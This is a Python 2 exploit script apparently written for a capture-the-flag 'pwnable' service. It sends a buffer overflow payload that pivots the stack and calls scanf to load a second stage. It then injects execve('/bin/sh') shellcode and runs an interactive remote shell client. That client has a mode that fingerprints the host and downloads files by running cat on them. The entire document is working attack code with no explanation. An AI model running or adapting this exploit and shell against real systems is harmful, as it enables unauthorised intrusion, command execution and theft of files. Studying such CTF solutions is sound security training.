#!/usr/bin/env python
from struct import *
import sys
import socket
from time import sleep

rhp     = ("pwnable.katsudon.org",32100)
sh      = "/bin/sh\x00"

offset_name     = 0x00020060
offset_retn     = 0x0002007c

addr_format     = 0x080485c7
addr_scanf      = 0x08048506
addr_buffer     = 0x0804a100

#==========
nc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
nc.settimeout(1.0)
nc.connect(rhp)

exploit =   "\x00"*(offset_retn-offset_name-4)
exploit +=  pack("<I", addr_buffer)         #$ebp=addr_buffer
exploit +=  pack("<I", addr_scanf)
exploit +=  pack("<I", addr_format)
exploit +=  pack("<I", addr_buffer)

nc.sendall(exploit+"\x0a")
nc.recv(1024)

payload =   pack("<I", 0xdeadbeef)
payload +=  pack("<I", addr_buffer+0x10)    #exec_addr
payload +=  sh
payload +=  "\x00"*(0x10-len(payload))
payload +=  "\x31\xc0"      #xor    %eax,%eax
payload +=  "\x04\x0f"      #add    0x0f,%al
payload +=  "\x34\x04"      #xor    0x04,%eal
payload +=  "\x89\xe3"      #mov    %esp,%ebx
payload +=  "\x31\xc9"      #xor    %ecx,%ecx
payload +=  "\x31\xd2"      #xor    %edx,%edx
payload +=  "\xcd\x80"      #int    0x80


open('exploit','wb').write(exploit+"\x0a")
open('payload','wb').write(payload+"\x0a")

nc.sendall(payload+"\x0a")
nc.recv(1024)
nc.recv(1024)

#==========

def ad_shell(cmd):
    if len(cmd)>0:
        nc.sendall(cmd + " 2>&1\x0a")
        
    rsp = ""
    try:
        while True:
            rsp += nc.recv(1024)
    except:
        True
    finally:
        return rsp

def advanced(nc):
    whoami = ad_shell('whoami').split('\n')[0]
    hostname = ad_shell('hostname').split('\n')[0]
    pwd = ad_shell('pwd').split('\n')[0]

    while True:
        cmd = raw_input('[%s@%s %s]$ ' % (whoami,hostname,pwd))
        if cmd.split(' ')[0]=='GET':
            fname = cmd.split(' ')[1]
            data = ad_shell('cat %s' % fname)
            if len(data)>0:
                open(fname.split('/')[-1],'wb').write(data)
                print '"%s" download succeeded!' % fname
            else:
                print 'download failed...'
                
        elif cmd.split(' ')[0]=='cd':
            ad_shell(cmd)
            pwd = ad_shell('pwd')[:-1]
        elif cmd.split(' ')[0]=='exit':
            nc.sendall("exit\x0a")
            break
        else:
            print ad_shell(cmd)

def normal(nc):
    while True:
        cmd = raw_input("$")
        if len(cmd)>0:
            nc.sendall(cmd + " 2>&1\x0a")

        if cmd!="exit":
            rsp = ""
            try:
                while len(rsp)%1024==0:
                    rsp += nc.recv(1024)
            except:
                rsp += "Response Timeout"
            finally:
                print rsp
        else:
            nc.sendall("exit\x0a")
            break
        
if __name__=='__main__':
    if raw_input('Advanced mode?(Y/others)...')=='Y':
        advanced(nc)
    else:
        normal(nc)
    nc.close()

#==========
